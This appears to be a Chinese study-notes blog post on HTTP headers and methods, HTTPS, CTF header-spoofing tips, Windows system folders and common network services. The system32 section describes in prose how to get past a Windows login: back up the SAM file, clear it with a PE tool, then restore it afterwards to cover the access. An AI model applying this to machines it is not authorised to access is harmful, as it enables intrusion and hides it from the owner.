<p>Accept：浏览器可接受的MIME类型。<br>
Accept - Charset：浏览器可接受的字符集。<br>
Accept - Encoding：浏览器能够进行解码的数据编码方式，比如gzip。Servlet能够向支持gzip的浏览器返回经gzip编码的HTML页面。许多情形下这可以减少5到10倍的下载时间。<br>
Accept - Language：浏览器所希望的语言种类，当服务器能够提供一种以上的语言版本时要用到。<br>
Authorization：授权信息，通常出现在对服务器发送的WWW - Authenticate头的应答中。<br>
Connection：表示是否需要持久连接。如果Servlet看到这里的值为“Keep - Alive”，或者看到请求使用的是HTTP 1.1（HTTP 1.1默认进行持久连接），它就可以利用持久连接的优点，当页面包含多个元素时（例如Applet，图片），显著地减少下载所需要的时间。要实现这一点，Servlet需要在应答中发送一个Content - Length头，最简单的实现方法是：先把内容写入ByteArrayOutputStream，然后在正式写出内容之前计算它的大小。<br>
Content - Length：表示请求消息正文的长度。<br>
Cookie：这是最重要的请求头信息之一，参见后面《Cookie处理》一章中的讨论。<br>
From：请求发送者的email地址，由一些特殊的Web客户程序使用，浏览器不会用到它。<br>
Host：初始URL中的主机和端口。<br>
If - Modified - Since：只有当所请求的内容在指定的日期之后又经过修改才返回它，否则返回304“Not Modified”应答。<br>
Pragma：指定“no - cache”值表示服务器必须返回一个刷新后的文档，即使它是代理服务器而且已经有了页面的本地拷贝。<br>
Referer：包含一个URL，用户从该URL代表的页面出发访问当前请求的页面。<br>
User - Agent：浏览器类型，如果Servlet返回的内容与浏览器类型有关则该值非常有用。<br>
UA - Pixels，UA - Color，UA - OS，UA - CPU：由某些版本的IE浏览器所发送的非标准的请求头，表示屏幕大小、颜色深度、操作系统和CPU类型。</p>
</blockquote>
<h4 id="什么是https">什么是HTTPS？</h4>
<blockquote>
<p>《图解HTTP》这本书中曾提过HTTPS是身披SSL外壳的HTTP。HTTPS是一种通过计算机网络进行安全通信的传输协议，经由HTTP进行通信，利用SSL/TLS建立全信道，加密数据包。HTTPS使用的主要目的是提供对网站服务器的身份认证，同时保护交换数据的隐私与完整性。</p>
<p>PS:TLS是传输层加密协议，前身是SSL协议，由网景公司1995年发布，有时候两者不区分。</p>
</blockquote>
<p>常见考点：</p>
<ul>
<li>
<p><strong>HTTP Method</strong></p>
<p>HTTP Method是可以自定义的，且区分大小写。</p>
<ul>
<li>
<p>HTTP/1.1协议中共定义了八种方法（有时也叫“动作”）来表明Request-URI指定的资源的不同操作方式：</p>
<p><strong>OPTIONS</strong><br>
返回服务器针对特定资源所支持的HTTP请求方法。也可以利用向Web服务器发送'*'的请求来测试服务器的功能性。<br>
<strong>HEAD</strong><br>
向服务器索要与GET请求相一致的响应，只不过响应体将不会被返回。这一方法可以在不必传输整个响应内容的情况下，就可以获取包含在响应消息头中的元信息。<br>
<strong>GET</strong><br>
向特定的资源发出请求。注意：GET方法不应当被用于产生“副作用”的操作中。<br>
<strong>POST</strong><br>
向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST请求可能会导致新的资源的建立和/或已有资源的修改。<br>
<strong>PUT</strong><br>
向指定资源位置上传其最新内容。<br>
<strong>DELETE</strong><br>
请求服务器删除Request-URI所标识的资源。<br>
<strong>TRACE</strong><br>
回显服务器收到的请求，主要用于测试或诊断。<br>
<strong>CONNECT</strong><br>
HTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器。</p>
</li>
</ul>
</li>
<li>
<p>CTF</p>
<p>1.要求从某个<strong>IP或者主机</strong>访问，一般是修改 X-Forwarded-For，X-Forwarded-Host，CLIENT-IP,host的参数的值</p>
<p>2.要求从<strong>某个国家</strong>访问，一般修改Accept-Language值</p>
<p>3.要求从<strong>某个页面</strong>访问就修改referer，有关身份认证类的一般再修改cookie的值</p>
</li>
</ul>
<h1 id="windows基础学习笔记一">Windows基础学习笔记(一)</h1>
<h2 id="c盘根目录常见文件夹">C盘根目录常见文件夹</h2>
<ul>
<li>
<p><strong>Documents and Settings/用户</strong>： Windows7中的“用户”文件夹其实就是XP中的 Documents andSettings文件夹，这里储存了用户的设置，包括用户文档、上网浏览信息、配置文件等数据。</p>
</li>
<li>
<p><strong>Downloads</strong>：这通常是下载软件的默认下载路径，<br>
建议修改软件设置改到其他硬盘分区。</p>
</li>
<li>
<p><strong>Drivers</strong>：部分驱动程序的文件夹。在etc中，用文本打开其中的hosts，其中的资料主要用来解析域名。</p>
</li>
<li>
<p>Favorites：收藏夹。</p>
</li>
<li>
<p><strong>Program Files</strong>：应用程序文件夹，一般软件默认都安装在这里，也有一些系统自带的应用程序。Windows7系统中，64位用户会多出一个 ProgramFies（X86）文件夹，这是系统中32位软件的安装目录</p>
<blockquote>
<p>Common Files：共用程序文件夹，用于同系列不同程序软件共同使用或调用数据，比如微软和Adob的各种软件。</p>
<p>ComPlus Applications：微软COM+组件使用的文件夹，删除后可能引起COM+组件不能运行。<br>
DFX：DFX是一种高效的XML索引方法，此文件夹与数据索引有关，不可以删除。</p>
</blockquote>
</li>
<li>
<p><strong>Program Data</strong>： Windows7的系统文件夹，放置程序的使用数据、设置等文件，不建议删除。Windows：存放操作系统主要文件，非常重要。</p>
</li>
<li>
<p>Temp：存放系统或其他软件临时文件，需经常清理</p>
</li>
<li>
<p>hiberfil.sys：系统的休眠功能所占用的硬盘空间的文件，不建议删除。</p>
</li>
<li>
<p>pagefile.sys：虛拟内存页面文件，不建议删除。</p>
</li>
<li>
<p>PerfLogs： Windows vista或 Windows7系统日志，记录如磁盘扫描错误等信息，没有必要删除。</p>
</li>
<li>
<p>Internet Explorer：系统自带的浏览器，删除后可能导致部分程序不能正常运行。</p>
</li>
<li>
<p>Install Shield Installation Information：专门存储安装程序信息的文件夹，用于某些程序的卸载和更新。</p>
</li>
<li>
<p>MSECache： MS Office运行时自动创建。</p>
</li>
<li>
<p>MSXML60：微软ⅩML解析器程序的文件夹。</p>
</li>
<li>
<p>microsoft frontpage： FrontPage是微软推出的款网页设计软件，此文件夹通常为空。</p>
</li>
<li>
<p>Movie maker：系统自带的一款视频编辑软件。</p>
</li>
<li>
<p>MSN Gaming Zone：一些系统自带的扑克牌等小游戏，可以删除。</p>
</li>
<li>
<p>Netmeeting：系统自带的网上聊天软件。</p>
</li>
<li>
<p>Outlook Express： Outlook Express WIndows内置的邮件收发端，不用可删。</p>
</li>
<li>
<p>Online Services：网络服务文件夹，不能删。</p>
</li>
<li>
<p>Windows Media Player：系统自带的一款多媒体播放器。</p>
</li>
<li>
<p>WinRAR：一款流行的压缩解压缩软件。</p>
</li>
<li>
<p>Xerox：用作自带的一些图像处理软件的临时空间，文件夹不能删除，但通常为空。</p>
</li>
</ul>
<h3 id="system32-保存系统的配置文件"><strong>system32</strong> --保存系统的配置文件</h3>
<blockquote>
<p>System\config下有一个SAM文件，这个文件就是用来保存用户的账号和密码的</p>
<p>对于win10系统来说，进到这个目录，首先就需要管理员权限，其次就算你进来了，这种东西都是一个被锁定的文件，在系统启动的时候他就已经被系统调动了，如果你想打开这个文件，电脑首先就会显示此文件已经被占用，具体的显示内容为“另一个程序正在使用此文件，进程无法访问。假设现在我们需要尝试渗透一个系统的一块软件数据，那么我们首先就要登陆进这个系统，打开软件才能拷贝数据，而且进去还不能靠改他的密码，这种解决方法就是，首先把SAM拷贝出来一份，然后用PE工具把他清掉，再登录系统的时候就可以不需要密码了，然后该做什么做什么，做完了以后重新进入PE，把之前我们备份的SAM再放进去。其实PE本身已经足够我们直接进入系统，但我们要知道，如果没有最终以用户的形式进入那个系统的话，我们就算找到了那个软件，那个软件本身也是不可读的，所以还是要有这种先将用户密码清除在从用户进入的过程。</p>
</blockquote>
<h2 id="windows常见服务">Windows常见服务</h2>
<p><u>Web</u>服务，<u>DNS</u>服务，<u>DHCP</u>服务，<u>邮件</u>服务，<u>Telnet</u>服务，<u>SSH</u>服务，<u>FTP</u>服务，<u>SMB</u>服务</p>
<ul>
<li>
<p>Web服务</p>
<blockquote>
<p>Web服务是一种<a href="https://zh.wikipedia.org/wiki/%E6%9C%8D%E5%8B%99%E5%B0%8E%E5%90%91%E6%9E%B6%E6%A7%8B">服务导向架构</a>的技术，通过标准的<a href="https://zh.wikipedia.org/wiki/Web">Web</a>协议提供服务，目的是保证不同平台的应用服务可以互操作。根据<a href="https://zh.wikipedia.org/wiki/W3C">W3C</a>的定义，<strong>Web服务</strong>（Web service）应当是一个<a href="https://zh.wikipedia.org/wiki/%E8%BD%AF%E4%BB%B6">软件</a>系统，用以支持<a href="https://zh.wikipedia.org/wiki/%E7%BD%91%E7%BB%9C">网络</a>间不同机器的互动操作。网络服务通常是许多<a href="https://zh.wikipedia.org/wiki/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8E%A5%E5%8F%A3">应用程序接口</a>（<a href="https://zh.wikipedia.org/wiki/API">API</a>）所组成的，它们透过网络，例如国际互联网（<a href="https://zh.wikipedia.org/wiki/Internet">Internet</a>）的远程<a href="https://zh.wikipedia.org/wiki/%E6%9C%8D%E5%8A%A1%E5%99%A8">服务器</a>端，执行客户所提交服务的请求。Web service是一个<a href="https://baike.baidu.com/item/%E5%B9%B3%E5%8F%B0/1064049">平台</a>独立的，低耦合的，自包含的、基于可<a href="https://baike.baidu.com/item/%E7%BC%96%E7%A8%8B">编程</a>的web的应用程序，可使用开放的<a href="https://baike.baidu.com/item/XML">XML</a>（<a href="https://baike.baidu.com/item/%E6%A0%87%E5%87%86%E9%80%9A%E7%94%A8%E6%A0%87%E8%AE%B0%E8%AF%AD%E8%A8%80/6805073">标准通用标记语言</a>下的一个子集）<a href="https://baike.baidu.com/item/%E6%A0%87%E5%87%86/219665">标准</a>来<a href="https://baike.baidu.com/item/%E6%8F%8F%E8%BF%B0/8928757">描述</a>、发布、发现、协调和配置这些应用程序，用于开发分布式的互操作的<a href="https://baike.baidu.com/item/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F/5985445">应用程序</a>。</p>
</blockquote>
</li>
</ul>
<blockquote>
<p>https://blog.csdn.net/Z_Grant/article/details/90650111</p>
</blockquote>
<ul>
<li>
<p>DNS服务</p>
<p>IP地址电脑理解不了URL域名，在这种情况下，使用dns服务。</p>
</li>
<li>
<p>DHCP服务</p>
</li>
</ul>
<p><strong>动态主机设置协议</strong>（英语：<strong>Dynamic Host Configuration Protocol</strong>**，DHCP**）是一个<a href="https://baike.baidu.com/item/%E5%B1%80%E5%9F%9F%E7%BD%91">局域网</a>的<a href="https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE">网络协议</a>，使用<a href="https://baike.baidu.com/item/UDP">UDP</a>协议工作，主要有两个用途：用于内部网或网络服务供应商自动分配<a href="https://baike.baidu.com/item/IP">IP</a>地址；给用户用于内部网管理员作为对所有计算机作中央管理的手段。</p>
<ul>
<li>Telnet服务</li>
</ul>
<p>Telnet协议是<a href="https://baike.baidu.com/item/TCP%2FIP%E5%8D%8F%E8%AE%AE">TCP/IP协议</a>族中的一员，是Internet远程登录服务的标准协议和主要方式。它为用户提供了在本地计算机上完成远程<a href="https://baike.baidu.com/item/%E4%B8%BB%E6%9C%BA/455151">主机</a>工作的能力。在<a href="https://baike.baidu.com/item/%E7%BB%88%E7%AB%AF/1903878">终端</a>使用者的电脑上使用telnet程序，用它连接到<a href="https://baike.baidu.com/item/%E6%9C%8D%E5%8A%A1%E5%99%A8/100571">服务器</a>。<a href="https://baike.baidu.com/item/%E7%BB%88%E7%AB%AF/1903878">终端</a>使用者可以在telnet程序中输入命令，这些命令会在<a href="https://baike.baidu.com/item/%E6%9C%8D%E5%8A%A1%E5%99%A8/100571">服务器</a>上运行，就像直接在服务器的控制台上输入一样。可以在本地就能控制<a href="https://baike.baidu.com/item/%E6%9C%8D%E5%8A%A1%E5%99%A8/100571">服务器</a>。要开始一个telnet会话，必须输入用户名和密码来登录<a href="https://baike.baidu.com/item/%E6%9C%8D%E5%8A%A1%E5%99%A8/100571">服务器</a>。Telnet是常用的<a href="https://baike.baidu.com/item/%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6/934368">远程控制</a>Web<a href="https://baike.baidu.com/item/%E6%9C%8D%E5%8A%A1%E5%99%A8">服务器</a>的方法。</p>
<ul>
<li>SSH服务</li>
</ul>
<blockquote>
<p>多用于Linux，与telnet类似，SSH 为 [Secure Shell](https://baike.baidu.com/item/Secure Shell) 的缩写，由 IETF 的网络小组（Network Working Group）所制定；SSH 为建立在应用层基础上的安全协议。SSH 是目前较可靠，专为<a href="https://baike.baidu.com/item/%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95/1071998">远程登录</a>会话和其他网络服务提供安全性的协议。利用 SSH 协议可以有效防止远程管理过程中的信息泄露问题。SSH最初是UNIX系统上的一个程序，后来又迅速扩展到其他操作平台。SSH在正确使用时可弥补网络中的漏洞。SSH客户端适用于多种平台。几乎所有UNIX平台—包括<a href="https://baike.baidu.com/item/HP-UX">HP-UX</a>、<a href="https://baike.baidu.com/item/Linux">Linux</a>、<a href="https://baike.baidu.com/item/AIX">AIX</a>、<a href="https://baike.baidu.com/item/Solaris/3517">Solaris</a>、<a href="https://baike.baidu.com/item/Digital">Digital</a> <a href="https://baike.baidu.com/item/UNIX">UNIX</a>、<a href="https://baike.baidu.com/item/Irix">Irix</a>，以及其他平台，都可运行SSH。传统的网络服务程序，如：<a href="https://baike.baidu.com/item/ftp">ftp</a>、pop和<a href="https://baike.baidu.com/item/telnet">telnet</a>在本质上都是不安全的，因为它们在网络上用<a href="https://baike.baidu.com/item/%E6%98%8E%E6%96%87">明文</a>传送口令和数据，别有用心的人非常容易就可以截获这些口令和数据。而且，这些服务程序的<a href="https://baike.baidu.com/item/%E5%AE%89%E5%85%A8%E9%AA%8C%E8%AF%81">安全验证</a>方式也是有其弱点的， 就是很容易受到“中间人”（man-in-the-middle）这种方式的攻击。所谓“中间人”的攻击方式， 就是“中间人”冒充真正的<a href="https://baike.baidu.com/item/%E6%9C%8D%E5%8A%A1%E5%99%A8">服务器</a>接收你传给服务器的数据，然后再冒充你把数据传给真正的服务器。服务器和你之间的数据传送被“中间人”转手做了手脚之后，就会出现很严重的问题。通过使用SSH，你可以把所有传输的数据进行加密，这样&quot;中间人&quot;这种攻击方式就不可能实现了，而且也能够防止DNS欺骗和IP欺骗。使用SSH，还有一个额外的好处就是传输的数据是经过压缩的，所以可以加快传输的<a href="https://baike.baidu.com/item/%E9%80%9F%E5%BA%A6/5456">速度</a>。SSH有很多功能，它既可以代替<a href="https://baike.baidu.com/item/Telnet">Telnet</a>，又可以为<a href="https://baike.baidu.com/item/FTP">FTP</a>、<a href="https://baike.baidu.com/item/PoP">PoP</a>、甚至为<a href="https://baike.baidu.com/item/PPP">PPP</a>提供一个安全的&quot;通道&quot;</p>
<p>从客户端来看，SSH提供两种级别的安全验证。</p>
<p>首先是基于口令的安全验证，只要你知道自己的帐号和口令，就可以登录到远程主机。所有传输的数据都会被加密，但是不能保证你正在连接的服务器就是你想连接的<a href="https://baike.baidu.com/item/%E6%9C%8D%E5%8A%A1%E5%99%A8">服务器</a>。可能会有别的服务器在冒充真正的服务器，也就是受到“中间人”这种方式的攻击。其次是基于密钥的安全验证，这需要依靠<a href="https://baike.baidu.com/item/%E5%AF%86%E5%8C%99">密匙</a>，也就是你必须为自己创建一对密匙，并把公用密匙放在需要访问的服务器上。如果你要连接到SSH服务器上，客户端软件就会向服务器发出请求，请求用你的密匙进行安全验证。服务器收到请求之后，先在该服务器上你的主目录下寻找你的公用密匙，然后把它和你发送过来的公用密匙进行比较。如果两个密匙一致，服务器就用公用密匙加密“质询”（challenge）并把它发送给客户端软件。客户端软件收到“质询”之后就可以用你的私人密匙解密再把它发送给服务器。用这种方式，你必须知道自己密匙的<a href="https://baike.baidu.com/item/%E5%8F%A3%E4%BB%A4">口令</a>。但是，与第一种级别相比，第二种级别不需要在网络上传送口令。</p>
<p>第二种级别不仅加密所有传送的数据，而且“中间人”这种攻击方式也是不可能的（因为他没有你的私人密匙）。但是整个登录的过程可能需要10秒。</p>
</blockquote>
<ul>
<li>FTP服务</li>
</ul>
<blockquote>
<p>即文件传输协议（<a href="https://baike.baidu.com/item/%E8%8B%B1%E6%96%87">英文</a>：<strong>F</strong>ile <strong>T</strong>ransfer <strong>P</strong>rotocol，<a href="https://baike.baidu.com/item/%E7%BC%A9%E5%86%99">缩写</a>：<strong>FTP</strong>）是用于在<a href="https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C">网络</a>上进行文件传输的一套标准协议，使用客户/服务器模式。它属于<a href="https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE">网络传输协议</a>的<a href="https://baike.baidu.com/item/%E5%BA%94%E7%94%A8%E5%B1%82">应用层</a>。文件传送（file transfer）和文件访问（file access）之间的区别在于：前者由FTP提供，后者由如NFS等应用系统提供</p>
<p><a href="https://baike.baidu.com/item/TCP%2FIP%E5%8D%8F%E8%AE%AE">TCP/IP协议</a>中，FTP标准命令TCP<a href="https://baike.baidu.com/item/%E7%AB%AF%E5%8F%A3">端口</a>号为21，Port方式数据端口为20。FTP的任务是从一台计算机将文件传送到另一台计算机，不受<a href="https://baike.baidu.com/item/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F">操作系统</a>的限制。</p>
<p>需要进行远程文件传输的计算机必须安装和运行ftp客户程序。在windows操作系统的安装过程中，通常都安装了tcp/ip协议软件，其中就包含了ftp客户程序。但是该程序是字符界面而不是图形界面，这就必须以<a href="https://baike.baidu.com/item/%E5%91%BD%E4%BB%A4%E6%8F%90%E7%A4%BA%E7%AC%A6">命令提示符</a>的方式进行操作，很不方便。</p>
</blockquote>
]]></content>
    </entry>
</feed>